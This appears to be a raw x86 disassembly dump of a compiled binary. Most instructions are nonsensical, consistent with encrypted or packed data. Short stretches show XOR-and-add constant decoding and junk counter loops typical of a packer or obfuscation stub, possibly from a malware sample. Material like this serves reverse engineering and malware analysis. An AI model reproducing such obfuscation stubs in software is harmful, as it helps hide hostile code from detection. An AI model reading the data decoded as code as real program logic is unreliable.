  41780f:	mov    esp,0xcd33b35c
  417814:	int3   
  417815:	ins    BYTE PTR es:[edi],dx
  417816:	jle    0x4177c7
  417818:	sub    eax,0x6503deb3
  41781d:	cdq    
  41781e:	imul   DWORD PTR [ebx+0x65]
  417821:	adc    bl,BYTE PTR [eax-0x79]
  417824:	xchg   ecx,eax
  417825:	jg     0x4177dd
  417827:	lods   al,BYTE PTR ds:[esi]
  417828:	shr    ah,0xdc
  41782b:	(bad)  
  41782d:	aas    
  41782e:	call   0x434fffcf
  417833:	adc    BYTE PTR [edi-0x58],al
  417836:	jecxz  0x417804
  417838:	das    
  417839:	adc    eax,0x5ca4aa4c
  41783e:	or     eax,0xb3c66948
  417843:	dec    ecx
  417844:	mov    edi,0x6e72b48e
  417849:	xchg   ecx,eax
  41784a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41784b:	xchg   cl,ch
  41784d:	mov    bl,0x1d
  41784f:	cld    
  417850:	pop    eax
  417851:	xchg   ecx,eax
  417852:	ds leave 
  417854:	dec    edi
  417855:	push   esp
  417856:	mov    eax,ss
  417858:	lahf   
  417859:	imul   esp,DWORD PTR [edi-0x37ff273],0x68254eaa
  417863:	fiadd  DWORD PTR [ebx-0x52]
  417866:	leave  
  417867:	xchg   ebp,eax
  417868:	push   ds
  417869:	popa   
  41786a:	aam    0x78
  41786c:	mov    edi,0xf23a2d81
  417871:	hlt    
  417872:	call   FWORD PTR [ebp+0x73]
  417875:	sub    BYTE PTR [ebx+0x1e],bl
  417878:	push   0xab0b5373
  41787d:	hlt    
  41787e:	cmp    DWORD PTR [eax+0x7b],esi
  417881:	neg    DWORD PTR [edi-0x5153a243]
  417887:	into   
  417888:	pusha  
  417889:	(bad)  
  41788a:	loopne 0x4178f9
  41788c:	inc    esi
  41788d:	je     0x4178e9
  41788f:	out    dx,al
  417890:	loopne 0x41783d
  417892:	call   0x7b35:0x23b97e4c
  417899:	and    DWORD PTR [esi+0x76c74301],0xffffffe7
  4178a0:	add    cl,bl
  4178a2:	(bad)  
  4178a3:	cld    
  4178a4:	xchg   ebx,eax
  4178a5:	loop   0x4178b1
  4178a7:	cmp    eax,0x96da0e5b
  4178ac:	les    cx,DWORD PTR ds:0xbfe97709
  4178b3:	fsub   QWORD PTR [ebx]
  4178b5:	fnstsw WORD PTR [ebp+0x48]
  4178b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178b9:	push   0x160ed711
  4178be:	add    DWORD PTR [ebx],ecx
  4178c0:	and    esp,DWORD PTR [edi+edi*4+0x49c1b713]
  4178c7:	pop    esi
  4178c8:	mov    esp,0x50005c99
  4178cd:	push   edx
  4178ce:	dec    edx
  4178cf:	and    esp,DWORD PTR [edi+0x3]
  4178d2:	dec    eax
  4178d3:	cmp    al,0xe9
  4178d5:	and    eax,DWORD PTR [edx]
  4178d7:	add    BYTE PTR [eax],al
  4178d9:	cmp    eax,0xced7cecf
  4178de:	aad    0xc5
  4178e0:	aad    0x63
  4178e2:	popa   
  4178e3:	adc    DWORD PTR [edi],edx
  4178e5:	(bad)  
  4178e6:	pusha  
  4178e7:	(bad)  
  4178e8:	jmp    0x78c0abf1
  4178ed:	add    eax,0x9878787e
  4178f2:	cmp    DWORD PTR [ecx],ebx
  4178f4:	loopne 0x4178cb
  4178f6:	jae    0x4178ef
  4178f8:	lods   eax,DWORD PTR ds:[esi]
  4178f9:	mov    ds:0x8f794744,eax
  4178fe:	adc    BYTE PTR [edx-0x7bf52d7b],cl
  417904:	mov    bh,0x6e
  417906:	push   ebx
  417907:	out    0x75,al
  417909:	fist   DWORD PTR [esi]
  41790b:	nop
  41790c:	scas   eax,DWORD PTR es:[edi]
  41790d:	xchg   edi,eax
  41790e:	(bad)  
  41790f:	fs scas eax,DWORD PTR es:[edi]
  417911:	je     0x4178ff
  417913:	push   ecx
  417914:	loopne 0x4178de
  417916:	jle    0x4178ba
  417918:	stos   BYTE PTR es:[edi],al
  417919:	sbb    al,0x21
  41791b:	sbb    eax,0x5414679e
  417920:	cmp    esi,ecx
  417922:	jnp    0x417912
  417924:	popf   
  417925:	mov    ch,0xd5
  417927:	pop    ebx
  417928:	fwait
  417929:	or     al,0x49
  41792b:	inc    ebx
  41792c:	in     eax,dx
  41792d:	int3   
  41792e:	mov    ?,WORD PTR [ebx+ebp*2-0x35b0ed87]
  417935:	and    bl,BYTE PTR [eax]
  417937:	xchg   BYTE PTR [ecx+0x6da62d1c],cl
  41793d:	fidivr WORD PTR [eax-0x5a31edcb]
  417943:	fld    DWORD PTR [ecx+0x57]
  417946:	repnz xchg si,ax
  417949:	dec    edi
  41794a:	pop    ebx
  41794b:	in     al,dx
  41794c:	pop    ecx
  41794d:	outs   dx,DWORD PTR ds:[esi]
  41794e:	mov    ebp,0xb231ee5f
  417953:	out    dx,al
  417954:	push   ebp
  417955:	mov    dl,0x4a
  417957:	dec    edi
  417958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417959:	hlt    
  41795a:	test   eax,0x55faa611
  41795f:	(bad)  
  417960:	cmp    eax,0xff6db5d6
  417965:	jae    0x417944
  417967:	mov    ds:0x2465c762,eax
  41796c:	cdq    
  41796d:	mov    WORD PTR [ebx],?
  41796f:	sbb    al,dh
  417971:	adc    DWORD PTR [edi+0x1d2f180],edi
  417977:	sbb    eax,0x9b88aaa3
  41797c:	ficom  WORD PTR [ecx+0x9bb749f]
  417982:	mov    edx,0xcb39f6e1
  417987:	dec    edx
  417988:	adc    ecx,DWORD PTR [edx-0x41]
  41798b:	xlat   BYTE PTR ds:[ebx]
  41798c:	ficomp DWORD PTR [ebx+0x56]
  41798f:	or     al,0x43
  417991:	psadbw mm0,QWORD PTR [ecx-0x52a983f9]
  417998:	mov    edx,0x83c22504
  41799d:	xor    dh,BYTE PTR [edi+0x4ae8b195]
  4179a3:	aad    0x10
  4179a5:	jg     0x41799e
  4179a7:	aas    
  4179a8:	sbb    al,0xe9
  4179aa:	ja     0x41798e
  4179ac:	div    esp
  4179ae:	pop    ds
  4179af:	leave  
  4179b0:	jmp    0x16b98e5f
  4179b5:	ins    DWORD PTR es:[edi],dx
  4179b6:	push   0x89f3e7e
  4179bb:	cwde   
  4179bc:	inc    ebp
  4179bd:	jge    0x4179f6
  4179bf:	imul   ebp
  4179c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179c2:	idiv   DWORD PTR ds:0xc351a087
  4179c8:	push   edx
  4179c9:	sbb    DWORD PTR [edx-0x63973eaa],esp
  4179cf:	push   0xffffff83
  4179d1:	mov    edx,0x21f9a700
  4179d6:	not    DWORD PTR [ebx]
  4179d8:	or     ah,bl
  4179da:	push   edi
  4179db:	lods   eax,DWORD PTR ds:[esi]
  4179dc:	push   esi
  4179dd:	in     eax,dx
  4179de:	cli    
  4179df:	pop    eax
  4179e0:	or     BYTE PTR [ebx-0x23],bh
  4179e3:	mov    dh,0x62
  4179e5:	sbb    al,0x18
  4179e7:	rol    BYTE PTR [edi],1
  4179e9:	enter  0xb934,0x5c
  4179ed:	push   esp
  4179ee:	jle    0x417983
  4179f0:	push   0x3ce03994
  4179f5:	xor    eax,DWORD PTR [bx+si+0x52]
  4179f9:	aas    
  4179fa:	mov    dl,0xe4
  4179fc:	dec    esi
  4179fd:	pop    ss
  4179fe:	pop    ss
  4179ff:	hlt    
  417a00:	imul   edi,DWORD PTR [eax-0x6a],0xffffff82
  417a04:	mov    dh,0x39
  417a06:	mov    ch,0x6
  417a08:	and    eax,DWORD PTR [esi-0x6a]
  417a0b:	push   es
  417a0c:	xor    DWORD PTR [ebp-0x3d810ada],edx
  417a12:	das    
  417a13:	mov    bl,0xb2
  417a15:	pop    DWORD PTR [edx+ebx*2]
  417a18:	mov    ebx,0x4d2b962
  417a1d:	aas    
  417a1e:	inc    esi
  417a1f:	sub    BYTE PTR [esi-0x4a8724a0],bl
  417a25:	ja     0x417a4d
  417a27:	inc    ecx
  417a28:	and    al,BYTE PTR es:[esi-0x2cb8af96]
  417a2f:	cld    
  417a30:	scas   al,BYTE PTR es:[edi]
  417a31:	fild   WORD PTR [esp+edx*4+0x38de1813]
  417a38:	(bad)  
  417a3a:	jecxz  0x4179e0
  417a3c:	jle    0x417a5e
  417a3e:	pop    ds
  417a3f:	cmp    BYTE PTR [ebx],al
  417a41:	data16 jmp 0x417a83
  417a44:	and    esi,DWORD PTR [ebp-0x50a0c9ed]
  417a4a:	shl    ah,cl
  417a4c:	push   ds
  417a4d:	fmul   DWORD PTR [edi+0x1a0acafe]
  417a53:	jl     0x4179db
  417a55:	xchg   edi,eax
  417a56:	inc    ebx
  417a57:	nop
  417a58:	adc    edx,ebp
  417a5a:	pop    esi
  417a5b:	mov    bl,0xca
  417a5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a5e:	adc    esp,DWORD PTR [edi]
  417a60:	loope  0x417a3c
  417a62:	arpl   WORD PTR [ebx+0x76],si
  417a65:	daa    
  417a66:	or     BYTE PTR [ebx+0x20fde9c8],ah
  417a6c:	push   ebx
  417a6d:	and    al,0x35
  417a6f:	pop    ebx
  417a70:	repnz mov ah,0xfe
  417a73:	loopne 0x417ad2
  417a75:	cmp    dl,bh
  417a77:	push   esi
  417a78:	or     esp,DWORD PTR [edi]
  417a7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a7b:	test   dl,ah
  417a7d:	lods   al,BYTE PTR ds:[esi]
  417a7e:	ins    BYTE PTR es:[edi],dx
  417a7f:	dec    eax
  417a80:	jl     0x417af4
  417a82:	enter  0x1d9c,0xff
  417a86:	dec    esi
  417a87:	mov    al,dl
  417a89:	jle    0x417a68
  417a8b:	add    DWORD PTR [edi-0x40],edi
  417a8e:	cmp    eax,0xa0667130
  417a93:	inc    esi
  417a94:	std    
  417a95:	lods   al,BYTE PTR ds:[esi]
  417a96:	mov    edi,0x54a4975c
  417a9b:	inc    edx
  417a9c:	test   al,0xb7
  417a9e:	daa    
  417a9f:	jmp    0x417b0a
  417aa1:	fcmovbe st,st(5)
  417aa3:	push   ebp
  417aa4:	ss push esi
  417aa6:	and    eax,0x96d7f334
  417aab:	adc    al,0xe8
  417aad:	and    BYTE PTR [esi-0x6c4a60ea],bh
  417ab3:	idiv   BYTE PTR [edx]
  417ab5:	popf   
  417ab6:	xchg   ebp,eax
  417ab7:	loopne 0x417b0b
  417ab9:	aam    0x93
  417abb:	pusha  
  417abc:	into   
  417abd:	imul   esp,DWORD PTR [esi-0x23c08908],0xffffffb6
  417ac4:	ins    DWORD PTR es:[edi],dx
  417ac5:	fs mov bl,0xe
  417ac8:	(bad)  
  417ac9:	cmp    BYTE PTR [edx+0x54],ch
  417acc:	je     0x417a5f
  417ace:	div    cl
  417ad0:	adc    DWORD PTR [esi+0x65],esi
  417ad3:	or     DWORD PTR [edi],0x5361dacf
  417ad9:	in     eax,dx
  417ada:	cmp    ecx,esi
  417adc:	mov    dh,BYTE PTR [ebx+0x1fdf5da6]
  417ae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ae3:	add    eax,0x70cbef97
  417ae8:	imul   eax,DWORD PTR [eax+ebp*1-0x3bba000b],0xffffffea
  417af0:	inc    esp
  417af1:	or     eax,0x2916e4a
  417af6:	dec    edi
  417af7:	cmp    eax,0x57f13a8d
  417afc:	mov    edx,0x7510850
  417b01:	mov    DWORD PTR [ebp+0x8],ecx
  417b04:	mov    eax,DWORD PTR [ebp-0x4]
  417b07:	xor    eax,edx
  417b09:	push   esi
  417b0a:	mov    esi,DWORD PTR [ebp+0x8]
  417b0d:	mov    ecx,0x327298
  417b12:	add    eax,ecx
  417b14:	cmp    DWORD PTR [esi+0x54],eax
  417b17:	pop    esi
  417b18:	je     0x417b26
  417b1e:	mov    eax,DWORD PTR [ebp+0x8]
  417b21:	jmp    0x417d67
  417b26:	mov    eax,DWORD PTR [ebp-0x4]
  417b29:	xor    eax,edx
  417b2b:	add    eax,ecx
  417b2d:	jmp    0x417d67
  417b32:	mov    eax,DWORD PTR [ebp-0x4]
  417b35:	jmp    0x417d5d
  417b3a:	cmp    eax,0xd53cc6d6
  417b3f:	int3   
  417b40:	leave  
  417b41:	fnstenv [esi-0x47]
  417b44:	or     eax,0xd39e096c
  417b49:	push   edx
  417b4a:	adc    DWORD PTR [ecx],esi
  417b4c:	jg     0x417bc6
  417b4e:	add    eax,0xb278787e
  417b53:	fiadd  DWORD PTR ss:[edi]
  417b56:	out    0xc9,al
  417b58:	push   esi
  417b59:	xchg   ecx,eax
  417b5a:	xchg   edx,eax
  417b5b:	mov    ecx,0x5f09d218
  417b60:	lahf   
  417b61:	mov    ah,0xa0
  417b63:	jns    0x417b72
  417b65:	sti    
  417b66:	pusha  
  417b67:	data16 imul BYTE PTR [eax-0xb]
  417b6b:	mov    esp,0xca3f0959
  417b70:	ror    DWORD PTR [edx+0x2bc150a3],1
  417b76:	sub    BYTE PTR [ebx-0x65de35ec],bh
  417b7c:	in     al,dx
  417b7d:	(bad)  
  417b7e:	fisub  WORD PTR [ecx]
  417b80:	sub    eax,0xcd54178b
  417b85:	cs xor al,0xf0
  417b88:	xchg   esp,eax
  417b89:	(bad)  
  417b8a:	jmp    0x773500cb
  417b8f:	imul   esp,DWORD PTR [edi-0x543ca88e],0xb16cc5fe
  417b99:	or     al,0x56
  417b9b:	rcr    BYTE PTR [esi-0x416a5bb6],cl
  417ba1:	lahf   
  417ba2:	adc    eax,0x73ea99bb
  417ba7:	xchg   DWORD PTR [esi-0x7c2d5fbd],edi
  417bad:	lods   al,BYTE PTR ds:[esi]
  417bae:	in     al,dx
  417baf:	aam    0xca
  417bb1:	mov    ebp,0x6c870881
  417bb6:	fisubr WORD PTR [ebx+0x71]
  417bb9:	inc    edi
  417bba:	sub    edi,DWORD PTR [esi-0x3f]
  417bbd:	paddsw mm4,QWORD PTR [ebx]
  417bc0:	jnp    0x417bc7
  417bc2:	cwde   
  417bc3:	cmp    dh,bh
  417bc5:	vprotq ymm5,xmm1,0xab
  417bca:	mov    edx,0x14702c80
  417bcf:	pushf  
  417bd0:	push   eax
  417bd1:	test   eax,0x1084fe61
  417bd6:	inc    esi
  417bd7:	pop    ebx
  417bd8:	shrd   DWORD PTR [edx],esp,0x97
  417bdc:	clc    
  417bdd:	add    bh,0xc4
  417be0:	lods   al,BYTE PTR ds:[esi]
  417be1:	sbb    BYTE PTR [ebx+0x6a],ch
  417be4:	mov    edx,0xccf7157
  417be9:	pop    ebx
  417bea:	dec    edi
  417beb:	dec    esp
  417bec:	adc    eax,0xdb8a396a
  417bf1:	inc    ecx
  417bf2:	les    esp,FWORD PTR [esi]
  417bf4:	jo     0x417b99
  417bf6:	jp     0x417c5f
  417bf8:	stos   DWORD PTR es:[edi],eax
  417bf9:	daa    
  417bfa:	out    0x16,al
  417bfc:	mov    es,WORD PTR [eax]
  417bfe:	je     0x417be7
  417c00:	dec    esi
  417c01:	mov    al,ds:0x6c2e2cc9
  417c06:	sahf   
  417c07:	mov    esi,0x42fbbd89
  417c0c:	icebp  
  417c0d:	pop    ds
  417c0e:	jno    0x417ba0
  417c10:	push   ecx
  417c11:	mov    ecx,0x50a22a84
  417c16:	xchg   edx,eax
  417c17:	pop    ecx
  417c18:	mov    esi,0x20eb0482
  417c1d:	mov    esp,0x3da92955
  417c22:	iret   
  417c23:	adc    bl,BYTE PTR [eax]
  417c25:	rcr    DWORD PTR [eax-0x32],0xcb
  417c29:	mov    dh,0x7e
  417c2b:	fidivr DWORD PTR [edi+edx*4+0x73]
  417c2f:	stc    
  417c30:	pop    edi
  417c31:	inc    esi
  417c32:	daa    
  417c33:	pop    esi
  417c34:	jge    0x417c76
  417c36:	xor    al,0xb3
  417c38:	in     eax,0x67
  417c3a:	or     al,0x4c
  417c3c:	das    
  417c3d:	and    cl,cl
  417c3f:	xchg   ebp,eax
  417c40:	push   ss
  417c41:	pop    edi
  417c42:	sub    ebx,DWORD PTR [edi+0x11]
  417c45:	xchg   esp,eax
  417c46:	cmp    al,0x70
  417c48:	jo     0x417cb9
  417c4a:	mov    eax,ds:0xbb087b00
  417c4f:	pop    edx
  417c50:	mov    DWORD PTR [edi+ebx*1-0x1b],0x7450e561
  417c58:	mov    dl,0xf3
  417c5a:	adc    ebx,DWORD PTR [esi]
  417c5c:	mov    cl,BYTE PTR [ecx+0x7428f09e]
  417c62:	inc    edi
  417c63:	mov    esp,0x1c3fdf03
  417c68:	cld    
  417c69:	popf   
  417c6a:	jmp    0xbd7c9057
  417c6f:	pop    edi
  417c70:	out    dx,eax
  417c71:	out    0xda,al
  417c73:	inc    eax
  417c74:	push   ds
  417c75:	xchg   ecx,eax
  417c76:	clc    
  417c77:	and    DWORD PTR [ecx-0x2bdf78ff],esp
  417c7d:	xor    al,0xe4
  417c7f:	pop    ebp
  417c80:	ret    
  417c81:	call   0xf8a9ab46
  417c86:	push   ebp
  417c87:	mov    ds,WORD PTR [edx-0x389ebcd9]
  417c8d:	int    0xfb
  417c8f:	add    eax,0x41d235e5
  417c94:	mov    ch,0x83
  417c96:	jp     0x417c96
  417c98:	jg     0x417ce5
  417c9a:	xor    BYTE PTR [eax*4-0x2bc2121b],ch
  417ca1:	pop    ss
  417ca2:	test   al,0x26
  417ca4:	cld    
  417ca5:	cmp    al,0xeb
  417ca7:	sub    eax,0x7a643952
  417cac:	sub    al,0x13
  417cae:	scas   eax,DWORD PTR es:[edi]
  417caf:	xchg   ecx,eax
  417cb0:	xchg   ebp,eax
  417cb1:	fsubr  DWORD PTR [ebp-0x76e701ba]
  417cb7:	xchg   edi,eax
  417cb8:	fiadd  WORD PTR [ebp+0x6b843b]
  417cbe:	mov    bl,0x71
  417cc0:	mov    DWORD PTR [ecx-0x7cd69074],ebx
  417cc6:	and    dl,BYTE PTR [ecx]
  417cc8:	into   
  417cc9:	mov    ds:0x7e5d5bf6,eax
  417cce:	sbb    bh,bl
  417cd0:	cmp    cl,al
  417cd2:	mov    dh,BYTE PTR [ebx]
  417cd4:	add    DWORD PTR [eax],eax
  417cd6:	arpl   WORD PTR [ecx-0x7ae0f89],ax
  417cdc:	inc    ecx
  417cdd:	xchg   BYTE PTR [ecx-0x5b990ea3],ch
  417ce3:	push   edx
  417ce4:	call   0xe84266ae
  417ce9:	stos   BYTE PTR es:[edi],al
  417cea:	and    dl,BYTE PTR [ecx+0x47]
  417ced:	inc    esp
  417cee:	loop   0x417d04
  417cf0:	test   bh,0xe8
  417cf3:	stos   DWORD PTR es:[edi],eax
  417cf4:	test   BYTE PTR [ebx],ch
  417cf6:	xchg   ebp,eax
  417cf7:	mov    cl,0x5e
  417cf9:	cmp    ebp,DWORD PTR [edi+0x2e]
  417cfc:	add    edx,esp
  417cfe:	xchg   esp,eax
  417cff:	lods   eax,DWORD PTR ds:[esi]
  417d00:	or     WORD PTR [ecx],cx
  417d03:	pop    ss
  417d04:	push   0x83f02deb
  417d09:	lgs    edx,FWORD PTR [ebp-0x6f]
  417d0d:	adc    BYTE PTR [edi+0x5969494a],dh
  417d13:	dec    esi
  417d14:	sub    al,0xa5
  417d16:	sub    DWORD PTR [esi],esp
  417d18:	sub    edi,ecx
  417d1a:	fld    DWORD PTR [ebp-0x47524ea6]
  417d20:	and    eax,0x87188747
  417d25:	xchg   ebx,eax
  417d26:	sbb    eax,0x9786e2d2
  417d2b:	addr16 push ds
  417d2d:	mov    esp,edi
  417d2f:	in     al,0x2f
  417d31:	pop    edx
  417d32:	popa   
  417d33:	xor    ebp,edi
  417d35:	push   0x581f422f
  417d3a:	in     eax,0x92
  417d3c:	dec    edi
  417d3d:	fmul   st(4),st
  417d3f:	cmc    
  417d40:	or     dl,ch
  417d42:	rcr    BYTE PTR [edi-0x767782c8],0x6a
  417d49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d4a:	xchg   DWORD PTR [eax],edi
  417d4c:	repz into 
  417d4e:	and    DWORD PTR ds:0xd2ff177b,edi
  417d54:	mov    al,ds:0xef52257c
  417d59:	xchg   ebp,eax
  417d5a:	aad    0xaf
  417d5c:	push   ss
  417d5d:	xor    eax,0x7510850
  417d62:	add    eax,0x327298
  417d67:	leave  
  417d68:	ret    0x4
  417d6b:	push   ebp
  417d6c:	mov    ebp,esp
  417d6e:	push   ecx
  417d6f:	and    DWORD PTR ds:0x42a821,0x0
  417d79:	jmp    0x417d8b
  417d7e:	mov    ecx,DWORD PTR ds:0x42a821
  417d84:	inc    ecx
  417d85:	mov    DWORD PTR ds:0x42a821,ecx
  417d8b:	cmp    DWORD PTR ds:0x42a821,0x13
  417d92:	jae    0x417dbe
  417d98:	cmp    DWORD PTR ds:0x42a821,0x16
  417d9f:	jne    0x417db3
  417da5:	push   0x42a825
  417daa:	push   DWORD PTR [ebp-0x18]
  417dad:	call   DWORD PTR ds:0x41d1f8
  417db3:	jmp    0x417d7e
  417db8:	adc    eax,DWORD PTR ds:0x42a79d
  417dbe:	mov    ecx,DWORD PTR [ebp+0x8]
  417dc1:	inc    eax
  417dc2:	mov    eax,0x7510850
  417dc7:	and    DWORD PTR ds:0x42a85d,0x42a851
  417dd1:	xor    ecx,eax
  417dd3:	or     DWORD PTR ds:0x42a855,0x42a8a9
  417ddd:	add    ecx,0x327298
  417de3:	mov    DWORD PTR ds:0x42a795,0xf60
  417ded:	mov    DWORD PTR [ebp+0x10],ecx
  417df0:	not    ecx
  417df2:	mov    DWORD PTR [ebp+0x8],0xf34cebc
  417df9:	mov    DWORD PTR ds:0x42a855,ebx
  417dff:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  417e06:	mov    DWORD PTR ds:0x42a82d,edi
  417e0c:	mov    ecx,0xf89c8539
  417e11:	push   esi
  417e12:	mov    DWORD PTR [ebp+0x10],0x70019fa
  417e19:	mov    esi,0x3248
  417e1e:	mov    esi,DWORD PTR [ebp-0x4]
  417e21:	cmp    ecx,esi
  417e23:	mov    DWORD PTR ds:0x42a779,0x4596
  417e2d:	je     0x4187eb
  417e33:	and    DWORD PTR ds:0x42a811,0x0
  417e3d:	jmp    0x417e51
  417e42:	xor    esi,esi
  417e44:	or     esi,DWORD PTR ds:0x42a811
  417e4a:	inc    esi
  417e4b:	mov    DWORD PTR ds:0x42a811,esi
  417e51:	cmp    DWORD PTR ds:0x42a811,0x11
  417e58:	jae    0x418196
  417e5e:	cmp    DWORD PTR ds:0x42a811,0x1d
  417e65:	jne    0x417e77
  417e6b:	push   DWORD PTR [ebp-0x28]
  417e6e:	push   DWORD PTR [ebp-0x14]
  417e71:	call   DWORD PTR ds:0x41d274
  417e77:	jmp    0x417e42
  417e7c:	jmp    0x418196
  417e81:	ret    
  417e82:	ret    0xc0c0
  417e85:	(bad)
  417e88:	leave  
  417e89:	retf   0xfdf1
  417e8c:	(bad)  
  417e8d:	fdiv   st(2),st
  417e8f:	cmp    BYTE PTR [ebx+0x787f371e],bh
  417e95:	jnp    0x417f15
  417e97:	js     0x417f11
  417e99:	pop    eax
  417e9a:	mov    dl,0x6
  417e9c:	fs fs add al,0x7f
  417ea0:	sbb    dh,ch
  417ea2:	jl     0x417ed4
  417ea4:	pop    esp
  417ea5:	cmp    DWORD PTR [ecx+0x35],eax
  417ea8:	call   0x6b24:0x793c6ebb
  417eaf:	mov    ebp,0x11fcb4b6
  417eb4:	lods   al,BYTE PTR ds:[esi]
  417eb5:	mov    bl,0xb2
  417eb7:	pop    edx
  417eb8:	push   0x11ff4536
  417ebd:	mov    DWORD PTR [esi+ecx*1],eax
  417ec0:	inc    esp
  417ec1:	xor    ch,BYTE PTR [ebx-0x1b307107]
  417ec7:	jne    0x417ee3
  417ec9:	test   eax,0xf22cc4d9
  417ece:	fcmovne st,st(0)
  417ed0:	push   esi
  417ed1:	mov    ?,WORD PTR [edx]
  417ed3:	icebp  
  417ed4:	data16 and al,cl
  417ed7:	dec    ecx
  417ed8:	push   esi
  417ed9:	push   cs
  417eda:	mov    dl,cl
  417edc:	push   eax
  417edd:	lea    ebx,[edx-0x21]
  417ee0:	xlat   BYTE PTR ds:[ebx]
  417ee1:	pop    ebx
  417ee2:	fs int3 
  417ee4:	mov    dl,ah
  417ee6:	pop    ebx
  417ee7:	ja     0x417f54
  417ee9:	fbstp  TBYTE PTR [esi-0x4b]
  417eec:	dec    esi
  417eed:	jo     0x417eb6
  417eef:	inc    ecx
  417ef0:	in     al,dx
  417ef1:	icebp  
  417ef2:	mov    dl,0xfb
  417ef4:	inc    esi
  417ef5:	fs je  0x417f35
  417ef8:	cld    
  417ef9:	mov    DWORD PTR [edx+0x60af7302],esp
  417eff:	int3   
  417f00:	cmp    eax,0xb263f5b1
  417f05:	add    ah,BYTE PTR [esi]
  417f07:	xchg   ecx,eax
  417f08:	or     DWORD PTR [ebx+0x1f],edi
  417f0b:	push   esp
  417f0c:	mov    cl,0xd5
  417f0e:	fs scas al,BYTE PTR es:[edi]
  417f10:	or     eax,0x26a0de35
  417f15:	sbb    eax,0x866c90c6
  417f1a:	popf   
  417f1b:	sahf   
  417f1c:	mov    ebp,0x8eb08ab3
  417f21:	xor    eax,ebx
  417f23:	mov    al,cl
  417f25:	and    al,0x68
  417f27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f28:	cdq    
  417f29:	mov    ds:0x82740955,eax
  417f2e:	sub    esi,DWORD PTR [esi]
  417f30:	sbb    ecx,esi
  417f32:	adc    DWORD PTR [ebp+esi*4-0x65edbcc2],0xffffffaa
  417f3a:	mov    edx,0x70666fe4
  417f3f:	push   edx
  417f40:	loop   0x417ef2
  417f42:	inc    ebx
  417f43:	lods   al,BYTE PTR ds:[esi]
  417f44:	mov    eax,0xcd9a2ec3
  417f49:	mov    ebp,0x2f2e61e9
  417f4e:	ins    DWORD PTR es:[edi],dx
  417f4f:	dec    ebp
  417f50:	mov    esi,DWORD PTR [eax+0x41166c56]
  417f56:	in     al,0x3b
  417f58:	mov    ?,WORD PTR [eax]
  417f5a:	xchg   ecx,eax
  417f5b:	stc    
  417f5c:	scas   al,BYTE PTR es:[edi]
  417f5d:	imul   ebx,esi,0xffffff80
  417f60:	lock pop edi
  417f62:	mov    dh,0x33
  417f64:	int    0xca
  417f66:	popf   
  417f67:	inc    ebx
  417f68:	iret   
  417f69:	and    al,0xed
  417f6b:	sub    BYTE PTR [edi+0x32fbb724],ah
  417f71:	out    dx,eax
  417f72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f73:	call   0x9d5c1987
  417f78:	retf   0x2e29
  417f7b:	push   ebp
  417f7c:	xchg   ebx,eax
  417f7d:	gs cs cmp ch,0xb3
  417f82:	loop   0x417fab
  417f84:	cmc    
  417f85:	sub    al,0x93
  417f87:	dec    edi
  417f88:	mov    ds:0x37488247,al
  417f8d:	cli    
  417f8e:	aam    0xe5
  417f90:	fldenv [ecx]
  417f92:	and    al,0x9e
  417f94:	mov    WORD PTR [eax-0x28a4cd37],gs
  417f9a:	add    al,0xd1
  417f9c:	cld    
  417f9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f9e:	add    DWORD PTR [ebx+0x23a0507],ebx
  417fa4:	and    DWORD PTR [ebx+0x4fc43c1d],esi
  417faa:	pop    esi
  417fab:	(bad)  
  417fac:	mov    edx,0x4a4e0e34
  417fb1:	test   al,0xb0
  417fb3:	adc    ecx,edi
  417fb5:	inc    eax
  417fb6:	cwde   
  417fb7:	(bad)  
  417fb8:	ds mov ecx,0xbf804d2
  417fbe:	fimul  WORD PTR [edi+0x7c212e80]
  417fc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fc5:	sub    DWORD PTR [edi+esi*4-0x2f],0xffffffc7
  417fca:	(bad)  
  417fcc:	xchg   BYTE PTR [eax+0x4a48a92b],ah
  417fd2:	cmp    esi,0xffffff99
  417fd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fd6:	sub    BYTE PTR [eax+0x501484b8],0x6e
  417fdd:	mov    WORD PTR [ecx-0x99046d9],fs
  417fe3:	ss mov dl,0x8a
  417fe6:	data16 int 0x6c
  417fe9:	mov    ah,0xcb
  417feb:	out    0x34,al
  417fed:	in     al,dx
  417fee:	mov    BYTE PTR [edi-0x3daa77c9],cl
  417ff4:	mov    al,ds:0xb9b6dae
  417ff9:	fcomi  st,st(6)
  417ffb:	pushf  
  417ffc:	std    
  417ffd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ffe:	pop    edi
  417fff:	into   
  418000:	mov    dh,0xd5
  418002:	fisub  DWORD PTR [esi]
  418004:	fwait
  418005:	add    DWORD PTR [edi-0x7],ebx
  418008:	rol    DWORD PTR [edi],1
  41800a:	(bad)  ds:[edi]
  41800d:	xor    bh,cl
  41800f:	xchg   ebx,eax
  418010:	mov    fs,WORD PTR [ecx-0x7a]
  418013:	add    ch,BYTE PTR [esi-0x43]
  418016:	int    0x6e
  418018:	mov    ah,0x97
  41801a:	call   0x617c4cd3
  41801f:	push   ds
  418020:	sbb    al,0xf2
  418022:	add    edx,DWORD PTR [esi+0x58abe1ba]
  418028:	pop    ds
  418029:	lahf   
  41802a:	arpl   bp,dx
  41802c:	sub    bl,BYTE PTR [ebp-0x83bd341]
  418032:	mov    eax,0xaacc1c13
  418037:	stos   BYTE PTR es:[edi],al
  418038:	pusha  
  418039:	les    ebp,FWORD PTR [ecx+0x3e]
  41803c:	mov    ah,0x8a
  41803e:	pop    ds
  41803f:	in     al,dx
  418040:	std    
  418041:	push   esi
  418042:	adc    dh,dh
  418044:	dec    ebx
  418045:	mov    ecx,0x8caa683a
  41804a:	push   ebp
  41804b:	gs (bad) 
  41804d:	loopne 0x418063
  41804f:	push   edi
  418050:	xchg   ebp,eax
  418051:	ds test eax,ebp
